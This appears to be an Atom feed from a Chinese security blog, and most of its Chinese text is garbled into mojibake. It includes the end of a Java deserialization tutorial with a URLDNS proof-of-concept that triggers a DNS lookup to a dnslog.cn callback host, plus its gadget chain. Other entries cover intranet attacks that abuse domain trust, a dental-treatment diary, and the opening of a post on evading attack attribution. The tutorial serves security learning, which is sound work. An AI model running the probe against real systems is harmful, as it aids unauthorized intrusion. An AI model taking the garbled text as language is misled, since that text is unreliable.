ä¸ºhashcodeä¸ä¸º-1ï¼Œä¸å†è§¦å‘dnsæŸ¥è¯¢</span></span><br><span class="line">        f.set(url,-<span class="number">1</span>); <span class="comment">// å°†hashcodeé‡æ–°è®¾ç½®ä¸º-1ï¼Œç¡®ä¿åœ¨ååºåˆ—åŒ–æˆåŠŸè§¦å‘</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./urldns.ser&quot;</span>);</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(fileOutputStream);</span><br><span class="line"></span><br><span class="line">            outputStream.writeObject(map);</span><br><span class="line">            outputStream.close();</span><br><span class="line">            fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">            FileInputStream fileInputStream = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;./urldns.ser&quot;</span>);</span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(fileInputStream);</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">            fileInputStream.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†æ¥è°ƒè¯•ä¸‹ ysoserialä¸­çš„ URLDNS æ¨¡å—ï¼Œè®¾ç½®debugå‚æ•°ï¼š</p><p><code>URLDNS &quot;http://7mczz6.dnslog.cn&quot;</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210408003414.png"></p><p>ç›´æ¥debugæŠ¥é”™ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210408003427.png"></p><p>æ”¹ä¸€ä¸‹Project å’Œ Moudlesä¸­çš„ <code>Project language level</code> ï¼Œå…¶å®å°±æ˜¯æ‰€æœ‰éƒ½è®¾ç½®æˆä¸€æ ·çš„ï¼ŒåŒ…æ‹¬pom.xml,å®åœ¨ä¸è¡Œï¼Œé‡æ–° <code>git pull</code> é‡æ–°å¯¼å…¥idea ä¹Ÿèƒ½è§£å†³</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210408003532.png"></p><p>ä¸‹æ–­ç‚¹è¿›è¡Œå•æ­¥è°ƒè¯•ï¼Œæœ€åçœ‹è¿™é‡Œ</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210408003557.png"></p><p>æ–¹æ³•ä¹‹é—´çš„è°ƒç”¨ä¹Ÿå¾ˆæ¸…æ¥šçš„å±•ç¤ºäº†å‡ºæ¥ã€‚</p><p>å€Ÿç”¨ä¸€ä½å¸ˆå‚…æ€»ç»“çš„ gadgets:</p><p>JDK1.8ä¸‹çš„è°ƒç”¨è·¯çº¿ï¼š</p><ol><li>HashMap-&gt;readObject()</li><li>HashMap-&gt;hash()</li><li>URL-&gt;hashCode()</li><li>URLStreamHandler-&gt;hashCode()</li><li>URLStreamHandler-&gt;getHostAddress()</li><li>InetAddress-&gt;getByName()</li></ol><p>è€Œåœ¨jdk1.7u80ç¯å¢ƒä¸‹è°ƒç”¨è·¯çº¿ä¼šæœ‰ä¸€å¤„ä¸åŒï¼Œä½†æ˜¯å¤§åŒå°å¼‚ï¼š</p><ol><li>HashMap-&gt;readObject()</li><li><strong>HashMap-&gt;putForCreate()</strong></li><li>HashMap-&gt;hash()</li><li>URL-&gt;hashCode()</li><li>ä¹‹åç›¸åŒ</li></ol><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p>æ„Ÿè°¢ï¼š</p><p><a href="https://wx.zsxq.com/dweb2/index/topic_detail/244415545824541">https://wx.zsxq.com/dweb2/index/topic_detail/244415545824541</a></p><p><a href="https://www.t00ls.net/articles-50486.html">https://www.t00ls.net/articles-50486.html</a></p><p><a href="https://wx.zsxq.com/dweb2/index/topic_detail/548242484442524">https://wx.zsxq.com/dweb2/index/topic_detail/548242484442524</a></p><p><a href="https://xz.aliyun.com/t/6787">https://xz.aliyun.com/t/6787</a></p><p><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a></p><p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1255945147512512">https://www.liaoxuefeng.com/wiki/1252599548343744/1255945147512512</a></p><p><a href="https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/">https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</a></p><p><a href="https://paper.seebug.org/1242/#urldns">https://paper.seebug.org/1242/#urldns</a></p><p><a href="https://www.yuque.com/tianxiadamutou/zcfd4v/fewu54">https://www.yuque.com/tianxiadamutou/zcfd4v/fewu54</a></p><p><a href="https://www.anquanke.com/post/id/201762">https://www.anquanke.com/post/id/201762</a></p><p><a href="https://medium.com/@m01e/ysoserial-urldns%E6%A8%A1%E5%9D%97%E5%88%86%E6%9E%90-33c80154f56f">https://medium.com/@m01e/ysoserial-urldns%E6%A8%A1%E5%9D%97%E5%88%86%E6%9E%90-33c80154f56f</a></p><p><a href="https://crossoverjie.top/2018/01/14/Synchronize/">https://crossoverjie.top/2018/01/14/Synchronize/</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;é¦–å‘äºé˜¿é‡Œäº‘å…ˆçŸ¥ç¤¾åŒºï¼Œ&lt;a href=&quot;https://xz.aliyun.com/t/9417&quot;&gt;https://xz.aliyun.com/t/9417&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="Javaååºåˆ—åŒ–" scheme="https://hack-for.fun/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>å†…ç½‘æ¸—é€ï¼šè·¨åŸŸæ”»å‡»åˆ†æåŠé˜²èŒƒ</title>
    <link href="https://hack-for.fun/593b.html"/>
    <id>https://hack-for.fun/593b.html</id>
    <published>2021-03-07T12:20:33.000Z</published>
    <updated>2021-03-10T16:13:12.770Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å†…ç½‘ä¸­ï¼Œä¸€èˆ¬é€šè¿‡åŸŸæ—è¿›è¡Œèµ„æºå…±äº«ã€‚</p><p>é€»è¾‘éš”ç¦»ï¼šæ ¹æ®ä¸åŒçš„èŒèƒ½åŒºåˆ†éƒ¨é—¨ã€åˆ’åˆ†ä¸»åŸŸå’Œå­åŸŸã€‚</p><p>ç‰©ç†éš”ç¦»ï¼šé€šè¿‡é˜²ç«å¢™å°†å„ä¸ªå­å…¬å¸åŠå„ä¸ªéƒ¨é—¨åˆ’åˆ†ä¸ºä¸åŒçš„åŒºåŸŸã€‚</p><p>ä¸ºä½•å¿…é¡»è¦å®åŸŸæ¥è¿›è¡Œæ”»å‡»ï¼Ÿ</p><blockquote><p>æ‹¿åˆ°äº†æŸä¸ªå­åŸŸæˆ–è€…åˆ†å…¬å¸çš„åŸŸæ§åˆ¶å™¨æƒé™ï¼Œä½†æ²¡æœ‰æ‹¿ä¸‹æ•´ä¸ªå…¬å¸å†…ç½‘çš„å…¨éƒ¨æƒé™ã€‚æˆ–è€…æ˜¯æƒ³è¦è·å¾—çš„èµ„æºä¸åœ¨å½“å‰æ‹¿ä¸‹çš„è¿™ä¸ªåŸŸå†…ã€‚</p></blockquote><h1 id="å¸¸è§çš„è·¨åŸŸæ”»å‡»æ–¹æ³•"><a href="#å¸¸è§çš„è·¨åŸŸæ”»å‡»æ–¹æ³•" class="headerlink" title="å¸¸è§çš„è·¨åŸŸæ”»å‡»æ–¹æ³•"></a>å¸¸è§çš„è·¨åŸŸæ”»å‡»æ–¹æ³•</h1><ul><li>å¸¸è§„æ¸—é€æ–¹æ³•ï¼ˆåˆ©ç”¨Webæ¼æ´è·¨åŸŸæ‹¿Shellï¼‰</li><li>åˆ©ç”¨å·²çŸ¥åŸŸæ•£åˆ—å€¼è¿›è¡Œå“ˆå¸Œä¼ é€’ã€ç¥¨æ®æ”»å‡»ï¼ˆå†…ç½‘é€šç”¨å¯†ç ã€å¯†ç å­˜åœ¨ä¸€å®šè§„åˆ™ã€åŸŸæ§åˆ¶å™¨æœ¬åœ°ç®¡ç†å‘˜å¯†ç å¯èƒ½ç›¸åŒï¼‰</li><li>åˆ©ç”¨åŸŸä¿¡ä»»å…³ç³»è¿›è¡Œè·¨åŸŸæ”»å‡»</li></ul><h2 id="åˆ©ç”¨åŸŸä¿¡ä»»å…³ç³»è¿›è¡Œè·¨åŸŸæ”»å‡»"><a href="#åˆ©ç”¨åŸŸä¿¡ä»»å…³ç³»è¿›è¡Œè·¨åŸŸæ”»å‡»" class="headerlink" title="åˆ©ç”¨åŸŸä¿¡ä»»å…³ç³»è¿›è¡Œè·¨åŸŸæ”»å‡»"></a>åˆ©ç”¨åŸŸä¿¡ä»»å…³ç³»è¿›è¡Œè·¨åŸŸæ”»å‡»</h2><p>åŸŸä¿¡ä»»ï¼šè§£å†³å¤šåŸŸç¯å¢ƒä¸­çš„è·¨åŸŸèµ„æºå…±äº«é—®é¢˜ã€‚åŸŸä¿¡ä»»åˆ©ç”¨DNSæœåŠ¡å™¨å®šä½ä¸¤ä¸ªä¸åŒå­åŸŸçš„åŸŸæ§åˆ¶å™¨ï¼Œå¦‚æœä¸¤ä¸ªåŸŸä¸­çš„åŸŸæ§åˆ¶å™¨éƒ½æ— æ³•æ‰¾åˆ°å¦ä¸€ä¸ªåŸŸï¼Œå°±ä¸å­˜åœ¨é€šè¿‡åŸŸä¿¡ä»»å…³ç³»è¿›è¡Œè·¨åŸŸèµ„æºå…±äº«ã€‚</p><h4 id="åŸŸä¿¡ä»»å…³ç³»ä»‹ç»"><a href="#åŸŸä¿¡ä»»å…³ç³»ä»‹ç»" class="headerlink" title="åŸŸä¿¡ä»»å…³ç³»ä»‹ç»"></a>åŸŸä¿¡ä»»å…³ç³»ä»‹ç»</h4><p><strong>åŸŸä¿¡ä»»å…³ç³»åˆ†ä¸ºå•å‘ä¿¡ä»»å’ŒåŒå‘ä¿¡ä»»</strong>ã€‚</p><p>ä¿¡ä»»æµå’Œè®¿é—®æµã€‚</p><p><strong>åŸŸä¿¡ä»»å…³ç³»ä¹Ÿå¯ä»¥åˆ†ä¸ºå†…éƒ¨ä¿¡ä»»å’Œå¤–éƒ¨ä¿¡ä»»</strong>ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å†…ç½‘ä¸­ï¼Œä¸€èˆ¬é€šè¿‡åŸŸæ—è¿›è¡Œèµ„æºå…±äº«ã€‚&lt;/p&gt;
&lt;p&gt;é€»è¾‘éš”ç¦»ï¼šæ ¹æ®ä¸åŒçš„èŒèƒ½åŒºåˆ†éƒ¨é—¨ã€åˆ’åˆ†ä¸»åŸŸå’Œå­åŸŸã€‚&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    
    <category term="çº¢è“å¯¹æŠ—" scheme="https://hack-for.fun/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
  </entry>
  
  <entry>
    <title>ç”Ÿæ´»è®°å½•ï¼šæˆ‘çš„å£è…”å¥åº·æŠ˜è…¾ä¹‹è·¯</title>
    <link href="https://hack-for.fun/516f.html"/>
    <id>https://hack-for.fun/516f.html</id>
    <published>2021-02-24T10:48:28.000Z</published>
    <updated>2021-03-10T16:12:58.220Z</updated>
    
    <content type="html"><![CDATA[<p>å¸Œæœ›èƒ½æˆåŠŸ</p><a id="more"></a><h1 id="é€ å­½"><a href="#é€ å­½" class="headerlink" title="é€ å­½"></a>é€ å­½</h1><p>å› ä¸ºä»¥å‰å°æ—¶å€™ï¼Œçˆ±åƒç”œé£Ÿï¼Œç„¶åæ™šä¸Šä¸åˆ·ç‰™ï¼Œå¯¼è‡´æˆ‘çš„ç‰™é½¿å¥åº·å°±éå¸¸å·®ï¼Œè¡¥ç‰™è¡¥äº†å¾ˆå¤šä¸ªäº†ï¼Œç„¶åå…­é¾„ç‰™æ˜¯ååˆ°äº†å·²ç»ä¸èƒ½è¡¥çš„ç¨‹åº¦ï¼Œå°±ä¸€ç›´é‚£æ ·æ‹–ç€â€¦â€¦ç›´åˆ°åªå‰©ä¸‹æ®‹æ ¹ã€‚</p><blockquote><p>å…­é¾„ç‰™ï¼Œå³6å·ç‰™ï¼Œä¸€è¾ˆå­åªé•¿ä¸€æ¬¡ã€‚åœ¨6å²çš„æ—¶å€™å¼€å§‹å‘è‚²é•¿å‡ºã€‚</p></blockquote><p>å…¶æ¬¡ï¼Œæˆ‘çš„ä¸Šæ’ç‰™é½¿ï¼Œæœ‰ä¸¤ã€ä¸‰é¢—å·¦å³é•¿çš„æ¯”è¾ƒâ€œå°–â€ï¼Œå°±æ˜¯æ²¡æŒ‰æ­£å¸¸çš„æ–¹å¼æ¥é•¿ã€‚ä¸‹æ’ç‰™é½¿ï¼Œå› ä¸ºå…­é¾„ç‰™çš„é—®é¢˜ï¼Œå·¦å³5å·ç‰™æ²¡æœ‰æ—è¾¹6å·ç‰™çš„æ”¯æ’‘ï¼Œé•¿æœŸå—åŠ›ä½œç”¨ä¸‹ï¼Œå¾€4å·ç‰™é ï¼Œå¯¼è‡´ä¸‹æ’ç‰™é½¿æ•´ä½“çœ‹ä¸Šå»æ¯”è¾ƒâ€œå€¾æ–œâ€ã€‚</p><h1 id="è´¹ç”¨è®°å½•"><a href="#è´¹ç”¨è®°å½•" class="headerlink" title="è´¹ç”¨è®°å½•"></a>è´¹ç”¨è®°å½•</h1><p>æŒ‚å·ï¼š11 *3 = 33å…ƒ</p><p>æŸ¥è¡€ï¼š96å…ƒ</p><p>æ‹ç‰™ç‰‡ï¼š160å…ƒ</p><p>æ¶ˆç‚è¯å’Œéº»é†‰è¯ï¼š11.20å…ƒ</p><p>æ‹”ç‰™ï¼š314å…ƒ</p><p>å¼€å§‹çŸ«æ­£ï¼š</p><p>ç¬¬ä¸€æ¬¡è´¹ç”¨ï¼š2256.35å…ƒï¼ˆçŸ«æ­£è´¹ç”¨æ˜¯åˆ†å‡ æ¬¡ç»™çš„ã€ç„¶åè¡¥äº†ä¸€é¢—ç‰™ï¼‰ï¼ŒçŸ«æ­£æœ€åç®—ä¸‹æ¥å·®ä¸å¤š8kï½12kå§ã€‚</p><h1 id="æŠ˜è…¾è®°å½•"><a href="#æŠ˜è…¾è®°å½•" class="headerlink" title="æŠ˜è…¾è®°å½•"></a>æŠ˜è…¾è®°å½•</h1><h2 id="æ–¹æ¡ˆ"><a href="#æ–¹æ¡ˆ" class="headerlink" title="æ–¹æ¡ˆ"></a>æ–¹æ¡ˆ</h2><p>æŒ‚å£è…”ç§‘ï¼ŒåŒ»ç”Ÿä¼šç»™ä½ çœ‹ç‰™é½¿æƒ…å†µï¼Œç„¶åè¯´å¤§æ¦‚æ–¹æ¡ˆã€‚</p><p>Aï¼šæœ‰æ™ºé½¿ï¼Œå¹¶ä¸”æ™ºé½¿æƒ…å†µè‰¯å¥½ã€‚å¯ä»¥é€šè¿‡çŸ«æ­£çš„æ–¹å¼ï¼Œå°†7å·ç‰™æ‹–åˆ°6å·ç‰™ï¼Œæ™ºé½¿æ›¿ä»£7å·ç‰™ã€‚</p><p>Bï¼šæ— æ™ºé½¿ï¼Œåªèƒ½é€šè¿‡ç§æ¤ç‰™çš„æ–¹å¼æ¥å¡«è¡¥6å·ç‰™ã€‚</p><p>Aã€Bæ–¹æ¡ˆï¼Œéƒ½éœ€è¦çŸ«æ­£ï¼ŒçŸ«æ­£ç›®çš„ï¼šé•¿æ—¶é—´ä¸‹6å·ç‰™ç¼ºå¤±ï¼Œå¯¼è‡´ä¸Š6å·ç‰™å‘ä¸‹å‘è‚²ç”Ÿé•¿ï¼Œéœ€è¦é€šè¿‡çŸ«æ­£å‘ä¸Šæ‹‰å‡ºç©ºé—´ï¼Œä¸ºç§æ¤ç‰™æä¾›ç©ºé—´ã€‚</p><p>æ‰€ä»¥ï¼Œæ­£å¥½åˆé€‚ï¼ŒçŸ«æ­£äº†ç‰™é½¿ä¹Ÿå¡«è¡¥äº†6å·ç‰™çš„ç¼ºå¤±ã€‚åªæ˜¯æ—¶é—´æˆæœ¬å’Œé‡‘é’±æˆæœ¬ã€‚</p><h2 id="æŸ¥è¡€ï¼ˆè¡€å¸¸è§„ã€HIVã€æ¢…æ¯’ã€ä¹™è‚ï¼‰"><a href="#æŸ¥è¡€ï¼ˆè¡€å¸¸è§„ã€HIVã€æ¢…æ¯’ã€ä¹™è‚ï¼‰" class="headerlink" title="æŸ¥è¡€ï¼ˆè¡€å¸¸è§„ã€HIVã€æ¢…æ¯’ã€ä¹™è‚ï¼‰"></a>æŸ¥è¡€ï¼ˆè¡€å¸¸è§„ã€HIVã€æ¢…æ¯’ã€ä¹™è‚ï¼‰</h2><p>  <img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210224195803.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210224195843.png"></p><h2 id="æ‹ç‰™ç‰‡"><a href="#æ‹ç‰™ç‰‡" class="headerlink" title="æ‹ç‰™ç‰‡"></a>æ‹ç‰™ç‰‡</h2><p>æ‹”ç‰™å’ŒçŸ«æ­£å‰éœ€è¦æ‹å…¨æ™¯ç‰‡å’Œä¾§ä½ç‰‡ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210224195157.png" alt="å…¨æ™¯ç‰‡"></p><p>ä»å…¨æ™¯ç‰‡ä¹Ÿå¯ä»¥çœ‹å‡ºï¼Œä¸Šæ’ç‰™é½¿çš„ä¸æ•´é½ã€è¿˜æœ‰ä¸‹é¢ä¸¤ä¸ª6å·ç‰™çš„æ®‹æ ¹ï¼Œä»¥åŠæ— æ™ºé½¿è¿™ä¹ˆä¸€ä¸ªæƒ…å†µã€‚</p><p>ä¸Šé¢æœ‰15é¢—ç‰™é½¿ï¼ˆå³è¾¹ä¼¼ä¹å¤šäº†ä¸€ä¸ªç‰™é½¿ï¼Œä¼°è®¡çŸ«æ­£çš„æ—¶å€™åˆè¦æ‹”ç‰™ã€‚ï¼‰ã€ä¸‹é¢æœ‰14é¢—ç‰™é½¿ï¼ˆä¸¤é¢—6å·ç‰™æ®‹æ ¹ä¹Ÿç®—è¿›å»äº†ï¼‰</p><p>ç™½è‰²éƒ¨åˆ†éƒ½æ˜¯è¡¥è¿‡ç‰™çš„éƒ¨åˆ†ï¼Œè¿™ä¸å¿…å¤šè§£é‡Šã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210224195210.png" alt="ä¾§ä½ç‰‡"></p><p>ä»ä¾§ä½å›¾å¯ä»¥çœ‹åˆ°ï¼Œç‰™é½¿å’¬åˆé¢æ˜¯æ²¡æœ‰å¯¹é½çš„ï¼Œç„¶åé¢ˆæ¤é‚£é‡Œæ„Ÿè§‰ä¼¼ä¹æœ‰ç‚¹é—®é¢˜ï¼Œä½†æ˜¯æ˜å¤©ä¸Šåˆå°±å»æ’MRIäº†ï¼Œå»éª¨ç§‘æ£€æŸ¥ä¸‹é¢ˆæ¤ã€‚</p><h2 id="æ‹”ç‰™"><a href="#æ‹”ç‰™" class="headerlink" title="æ‹”ç‰™"></a>æ‹”ç‰™</h2><p>å…ˆå»æ‹¿è¯ï¼š</p><ul><li>æ¶ˆç‚è¯</li><li>éº»é†‰è¯</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210224195226.png"></p><p>åƒäº†è¯ï¼Œç„¶åå°±å»æ‹”ç‰™ã€‚æ‹”ç‰™å…ˆæ‰“éº»è¯ï¼Œè¿‡ç¨‹å°ç–¼ï¼Œé—®é¢˜ä¸å¤§ã€‚</p><p>ä¸‹é¢çš„å›¾ç‰‡å¯èƒ½æœ‰ç‚¹è¡€è…¥ï¼Œæ™•è¡€æ‚£è€…è¯·è¿œç¦»æˆ˜åœºã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210224195135.png" alt="æ‹”ç‰™çš„è£…å¤‡"></p><p>åœ¨æµè¡€å’Œéº»é†‰çš„ä½œç”¨ä¸‹ï¼Œ ä¸¤ä¸ª6å·ç‰™éƒ½æ‹”äº†ä¸‹æ¥ã€‚ä¸ä¸Šå›¾äº†ã€‚</p><p>ç„¶åå°±æ˜¯éœ€è¦æ³¨æ„ï¼š</p><ul><li>æ‹”ç‰™åç¬¬ä¸€å¤©ä¸èƒ½åˆ·ç‰™ã€åŠ¨é™å¾ˆå¤§çš„æ¼±å£</li><li>ä¸èƒ½åƒå¸¸è§„çš„é£Ÿç‰©ï¼Œæœ€å¥½åƒæµä½“</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210224195109.png"></p><h2 id="æ‹†çº¿"><a href="#æ‹†çº¿" class="headerlink" title="æ‹†çº¿"></a>æ‹†çº¿</h2><p>ä¸€å‘¨åå°±å»æ‹†çº¿äº†ï¼Œåœ¨æœ‰çº¿çš„æƒ…å†µä¸‹ï¼Œæ¼±å£æœ‰æ—¶å€™ä¼šæ„Ÿè§‰åˆ°å°å°çš„ç—›ï¼Œä½†æ˜¯æ²¡å•¥å¤§é—®é¢˜ã€‚</p><p>æ‹†çº¿çš„è¿‡ç¨‹å¾ˆè½»æ¾ï¼Œä¸€ç‚¹ä¹Ÿä¸ç—›ã€‚</p><p>å…ˆæ˜¯ä¸Šç¢˜ä¼ç»™éƒ¨ä½æ¶ˆæ¯’ï¼Œæ¼±å£ï¼Œç„¶åå°±å¼€å§‹æ‹†çº¿äº†ã€‚</p><p>æ²¡æœ‰ä»»ä½•ç–¼ç—›æ„Ÿã€‚</p><h2 id="å–æ¨¡"><a href="#å–æ¨¡" class="headerlink" title="å–æ¨¡"></a>å–æ¨¡</h2><p>æ‹”äº†å‘€ï¼Œå› ä¸ºæˆ‘è¿˜è¦çŸ«æ­£ï¼Œæ‰€ä»¥ç´§æ¥ç€å°±å–æ¨¡äº†ã€‚</p><p>å–æ¨¡å°±ä¼šç”¨ä¸€ä¸ªç¡…èƒ¶ä¼¼çš„ä¸œè¥¿ï¼ŒåŒ…åœ¨å˜´é‡Œï¼Œæœ€åå‡ºæ¥çš„ç»è¿‡ä¸€ç³»åˆ—æ“ä½œå°±æ˜¯æ¨¡å‹ã€‚</p><p>æ­¤å¤–ï¼Œè¿˜ä¼šæ”¾ä¸€ä¸ªé•œç‰‡åœ¨å˜´é‡Œï¼Œæ‹ç…§ï¼Œä¸Šä¸‹å„ä¸€æ¬¡ã€‚</p><p>ç„¶åè¿˜ä¼šæ‹ç…§ï¼ˆæ­£é¢ã€ä¾§é¢ã€å·¦å³45åº¦æ‹ç…§ï¼‰ï¼Œæ­£å¸¸è¡¨æƒ…å’Œéœ²é½¿ç¬‘ã€‚</p><p>åŒ»ç”Ÿè¯´æˆ‘çš„ä»€ä¹ˆï¼Œå…·ä½“å¿˜äº†å«å•¥äº†ï¼Œä¼¼ä¹æœ‰ç‚¹æ–œï¼Œç„¶ååˆç”¨äº†ä¸€æ ¹é•¿çš„ç›´å°ºç±»ä¼¼çš„æœ¨ç‰‡ï¼Œè®©æˆ‘å’¬ç€ï¼Œç„¶åæ‹ç…§ã€‚</p><p>å–æ¨¡çš„è¿‡ç¨‹ä¸­ï¼Œä¼¼ä¹æˆ‘çš„è„‘è¢‹æœ‰ç‚¹ä¹ æƒ¯æ€§åå€¾ã€‚ã€‚ã€‚çœ‹æ¥ä½“æ€é—®é¢˜è¿˜å¾ˆå¤šã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210307151202.JPG"></p><p>å°±æ”¾ä¸€å¼ å›¾ç‰‡å§ã€‚ã€‚ç‰™ç¼æ¯”è¾ƒå¤§ï¼Œå®¹æ˜“å¡ä¸œè¥¿ï¼Œè¦ç»å¸¸æ¼±å£ã€‚</p><p>ç‰™åŒ»è¯´ä¸€ä¸ªæ˜ŸæœŸåå°±å¯ä»¥å»åšçŸ«æ­£äº†ï¼Œå› ä¸ºè¿™æ®µæ—¶é—´æ˜¯ç»™å¥¹æƒ³æ–¹æ¡ˆçš„ã€‚</p><h2 id="å…¨å£çŸ«æ­£ï¼ˆ2021-3-9ï¼‰"><a href="#å…¨å£çŸ«æ­£ï¼ˆ2021-3-9ï¼‰" class="headerlink" title="å…¨å£çŸ«æ­£ï¼ˆ2021-3-9ï¼‰"></a>å…¨å£çŸ«æ­£ï¼ˆ2021-3-9ï¼‰</h2><p>çŸ«æ­£ä¹‹å‰ï¼Œå³ä¸Š6å·ç‰™åˆå‡ºé—®é¢˜äº†ï¼ŒæŠŠä¹‹å‰è¡¥çš„ç‰™é½¿ç»™é‡æ–°è¡¥äº†ä¸€ä¸‹ã€‚</p><p>â€¦â€¦</p><p>â€¦â€¦</p><p>â€¦â€¦</p><p>ç„¶åå°±æ˜¯å¼€å§‹çŸ«æ­£ï¼š</p><p>ç²˜çŸ«æ­£å™¨é™„ç€ç”¨çš„æ²Ÿæ§½ï¼Œç„¶åå°±æ˜¯ç©¿é’¢ä¸ï¼Œç„¶åå°±æ˜¯å¼„é’¢ä¸ï¼Œå†ç„¶åå°±æ˜¯è°ƒæ•´ä¸€ä¸‹ï¼Œçœ‹æœ‰æ²¡æœ‰å’¬åˆçš„æ—¶å€™å­˜åœ¨å†²çªçš„åœ°æ–¹ã€‚</p><p>å¼„å®Œä¹‹ååæ­£å¾ˆéš¾å—ï¼Œåƒé¥­éƒ½ä¸æ–¹ä¾¿ï¼Œå’¬ä¸œè¥¿éƒ½æ—¶å€™è¿˜ç–¼ã€‚</p><p>ç„¶åå°±æ˜¯å·®ä¸å¤š æ¯ä¸€ä¸ªæœˆå·¦å³å°±è¦å»å¤è¯Šä¸€æ¬¡å§ã€‚</p><hr><p>ä¸‹é¢ç”¨æ¥è®°å½•ä¸€ä¸‹å˜åŒ–è¿‡ç¨‹å§ å“ˆå“ˆå“ˆï¼Œè¿˜æ˜¯æ¯”è¾ƒæœŸå¾…çš„ã€‚</p><p>ï¼ˆå¯èƒ½ä¼šå¼•èµ·ä¸é€‚ï¼Œè°¨æ…è§‚çœ‹ã€‚</p><p>ä½©æˆ´çŸ«æ­£å™¨çš„ç¬¬ä¸€å¤©ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210311000820.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210311001025.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;å¸Œæœ›èƒ½æˆåŠŸ&lt;/p&gt;</summary>
    
    
    
    
    <category term="æ‚è°ˆ" scheme="https://hack-for.fun/tags/%E6%9D%82%E8%B0%88/"/>
    
  </entry>
  
  <entry>
    <title>å¦‚ä½•é˜²æ­¢æº¯æºä»¥åŠåæº¯æº</title>
    <link href="https://hack-for.fun/49b7.html"/>
    <id>https://hack-for.fun/49b7.html</id>
    <published>2021-02-21T12:06:38.000Z</published>
    <updated>2021-04-03T03:02:08.360Z</updated>
    
    <content type="html"><![CDATA[<p>æ¸©æ•…è€ŒçŸ¥æ–°ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210222210541.png"></p><a id="more"></a><ul><li>èµ„æ–™å‡æ¥è‡ªäº’è”ç½‘ä»¥åŠä¸ªäººæ•´ç†ï¼Œä»…ç”¨ä½œå­¦ä¹ ç”¨é€”ï¼Œç¦æ­¢éæ³•åˆ©ç”¨ï¼Œè¯¦æƒ…ã€Šç½‘ç»œå®‰å…¨æ³•ã€‹ã€‚</li><li>å¦‚æœ‰ä¾µæƒï¼Œè”ç³»åˆ é™¤ï¼Œæ„Ÿè°¢ï¼</li></ul><h1 id="æº¯æº"><a href="#æº¯æº" class="headerlink" title="æº¯æº"></a>æº¯æº</h1><blockquote><p>ç½‘ç»œæ”»å‡»æº¯æºæŠ€æœ¯é€šè¿‡ç»¼åˆåˆ©ç”¨å„ç§æ‰‹æ®µä¸»åŠ¨åœ°è¿½è¸ªç½‘ç»œæ”»å‡»å‘èµ·è€…ã€å®šä½æ”»å‡»æºï¼Œç»“åˆç½‘ç»œå–è¯å’Œå¨èƒæƒ…æŠ¥ï¼Œæœ‰é’ˆå¯¹æ€§åœ°å‡ç¼“æˆ–ååˆ¶ç½‘ç»œæ”»å‡»ï¼Œäº‰å–åœ¨é€ æˆç ´åä¹‹å‰æ¶ˆé™¤éšæ‚£ï¼Œåœ¨ç½‘ç»œå®‰å…¨é¢†åŸŸå…·æœ‰éå¸¸é‡è¦çš„ç°å®æ„ä¹‰ã€‚</p></blockquote><p>æ”»å‡»æº¯æºæŠ€æœ¯ï¼Œå›½å¤–åˆè¢«ç§°ä¸ºâ€œThreat 